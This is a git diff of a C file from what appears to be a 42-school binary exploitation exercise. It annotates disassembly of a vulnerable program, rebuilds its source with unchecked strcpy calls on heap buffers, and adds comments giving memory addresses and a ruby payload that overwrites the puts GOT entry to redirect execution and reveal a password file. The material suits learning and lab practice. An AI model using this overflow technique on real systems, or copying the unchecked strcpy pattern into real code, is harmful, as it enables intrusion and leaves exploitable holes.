@@ -6,7 +6,7 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/04/16 00:24:36 by fcadet            #+#    #+#             */
-/*   Updated: 2021/04/16 01:49:29 by fcadet           ###   ########.fr       */
+/*   Updated: 2021/04/16 15:28:54 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,7 +32,7 @@
 //Dump of assembler code for function main:
 //   0x08048521 <+0>:	push   %ebp
 //   0x08048522 <+1>:	mov    %esp,%ebp
-//   0x08048524 <+3>:	and    $0xfffffff0,%esp
+//   0x08048524 <+3>:	and    $0xfffffff0,%esp < 8 octet alignment
 //
 //   0x08048527 <+6>:	sub    $0x20,%esp
 //
@@ -84,18 +84,18 @@
 //   0x080485ba <+153>:	mov    %eax,(%esp) < second half of second var as first parameter
 //   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
 //
-//   0x080485c2 <+161>:	mov    $0x80486e9,%edx
-//   0x080485c7 <+166>:	mov    $0x80486eb,%eax
+//   0x080485c2 <+161>:	mov    $0x80486e9,%edx < "r"
+//   0x080485c7 <+166>:	mov    $0x80486eb,%eax < "/home/user/level8/.pass"
 //   0x080485cc <+171>:	mov    %edx,0x4(%esp)
 //   0x080485d0 <+175>:	mov    %eax,(%esp)
 //   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
 //
-//   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
-//   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
-//   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
+//   0x080485d8 <+183>:	mov    %eax,0x8(%esp) < fopen result
+//   0x080485dc <+187>:	movl   $0x44,0x4(%esp) < 68
+//   0x080485e4 <+195>:	movl   $0x8049960,(%esp) < global c
 //   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
 //
-//   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+//   0x080485f0 <+207>:	movl   $0x8048703,(%esp) < "~~"
 //   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
 //
 //   0x080485fc <+219>:	mov    $0x0,%eax
@@ -106,8 +106,19 @@
 #include <time.h>
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
 
-char	*c;
+//first var = 0x0804a008
+//first buffer = 0x0804a018
+//second var = 0x0804a028 -> 0x0804a028 + 4 (for second half) - 0x0804a018 = 20 (octets from first buffer to second half of second var)
+//second buffer = 0x0804a038
+//
+//puts @ 0x08049928 in GOT
+//m @ 0x080484f4
+//
+//ruby -e 'print "x" * 20 + "\x28\x99\x04\x08" + " \xf4\x84\x04\x08"' > /tmp/exploit
+
+char	c[68];
 
 void	m(void) {
 	printf("%s - %d\n", c, (int)time(NULL));
@@ -125,8 +136,11 @@ int		main(int argc, char **argv) {
 	b[0] = 2;
 	b[1] = (unsigned int)malloc(8);
 
-	strcpy((char *)a[1], argv[1]);
+	strcpy((char *)a[1], argv[1]); // dest is an address on the heap wich contains another adress on the heap
 	strcpy((char *)b[1], argv[2]);
+
+	fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
+	puts("~~");
 
 	return (0);
 }
